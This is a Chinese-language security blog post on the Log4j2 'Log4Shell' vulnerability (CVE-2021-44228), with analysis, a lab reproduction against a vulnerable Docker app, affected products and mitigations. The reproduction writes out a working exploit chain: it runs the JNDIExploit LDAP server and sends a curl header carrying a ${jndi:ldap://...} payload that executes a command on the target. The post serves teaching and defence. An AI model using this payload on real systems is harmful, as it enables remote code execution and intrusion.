---
title: Apache Log4j2远程代码执行漏洞（CVE-2021-44228）
date: 2021-12-13 13:38:42
tags:
  - Cyber Security 
  - Apache Log4j2
  - CVE-2021-44228
  - CNVD-2021-95914
description: 
  - Apache Log4j2远程代码执行漏洞分析与复现
categories: 
  - Cyber Security
copyright_author: Tensor
copyright_author_href: https://github.com/ZLLVZY
copyright_url: https://zllvzy.github.io/2021/12/13/Apache%20Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/
copyright_info: 此文章版权归Tensor所有，如有转载，请注明来自原作者
cover: https://logging.apache.org/log4j/2.x/images/logo.png

---
# Apache Log4j2远程代码执行漏洞（CVE-2021-44228）

## Overview

-   Log4j2?

-   漏洞分析

-   漏洞复现

-   漏洞影响

-   漏洞建议

## Log4j2简介

Log4j是Apache的一个开源项目，使用Log4j可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。

Apache Log4j2 是 Log4j 的升级版本，该版本与之前的 log4j1.x 相比带来了显著的性能提升，并且修复一些存在于 Logback 中固有的问题的同时提供了很多在 Logback 中可用的性能提升。

## 漏洞分析

漏洞细节暂不细说，大致为format方法之中对字符进行按位比较，如果连续的两个字符是${，则进行替换操作，然后传入org.apache.logging.log4j.core.lookup.JndiLookup类的lookup方法，最后导致JNDI注入。

## 漏洞复现

漏洞复现主要参照[https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)

1.   准备Log4j2环境

在这使用docker镜像ghcr.io/christophetd/log4shell-vulnerable-app，并将容器8080端口映射至本机8080。
```
sudo docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```
![Log4j2环境](https://s4.ax1x.com/2021/12/13/oO87DI.png)

2.   使用[JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip)来启动测试的LDAP服务器
```
wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
```
![下载JNDIExploit](https://s4.ax1x.com/2021/12/13/oO8TKA.png)

![EXP:LDAP服务器](https://s4.ax1x.com/2021/12/13/oO848e.png)

3.   JNDI注入，执行命令'touch /tmp/pwned'
```
# will execute 'touch /tmp/pwned'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```
![JNDI注入，执行命令](https://s4.ax1x.com/2021/12/13/oO8hCD.png)

![JNDI注入，执行命令](https://s4.ax1x.com/2021/12/13/oO85gH.png)


4.   查看容器内'/tmp'目录下是否存在'pwned'，
```
docker exec vulnerable-app ls /tmp
```
![查看执行结果](https://s4.ax1x.com/2021/12/13/oO8Ivd.png)

## 漏洞影响

漏洞影响的产品版本包括：Apache Log4j2 2.0 - 2.15.0-rc1

因Log4j2被中间件、Web应用、开发框架广泛应用。以下应用及组件均受影响：
Jedis
Logging
Logstash
HikariCP
Hadoop Hive
ElasticSearch
Apache Solr
Apache Struts2
Apache Flink
Apache Druid
Apache Log4j SLF4J Binding
spring-boot-strater-log4j2
Camel :: Core
JBoss Logging 3
JUnit Vintage Engine
WSO2 Carbon Kernel Core

## 漏洞建议

建议更新Log4j2至安全版本
[https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2)

建议同时采用如下临时措施进行漏洞防范：

1）添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；

2）在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；

3）JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；

4）部署使用第三方防火墙产品进行安全防护。

## 免责声明

本文仅供学习使用，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。



